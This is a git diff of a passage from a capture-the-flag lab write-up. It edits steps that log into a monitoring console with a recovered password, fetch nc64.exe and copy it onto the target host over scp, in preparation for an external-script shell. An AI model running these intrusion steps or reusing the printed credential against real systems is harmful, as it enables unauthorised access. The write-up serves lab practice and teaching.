@@ -514,13 +514,7 @@ We already know the password `ew2x6SsGTxjRwXOT`.<br>
 After logged in, we see the following metrics.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-21-45-04.png)
 
-To create an external script, we can go `Settings` -> `External Scripts` -> `Scripts` -> `+ Add new`.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-10-51-49.png)
-
-Then, we have this console.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-10-55-01.png)
-
-Before adding an external script, upload `nc64.exe` which can be downloaded from here.<br>
+Before adding an external script, upload `nc64.exe` which can be downloaded from [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------).<br>
 We use `scp` to transfer these files since we already have the credential.
 ```
 root@kali:~# scp ./nc64.exe nadine@10.10.10.184:C:/temp/nc64.exe
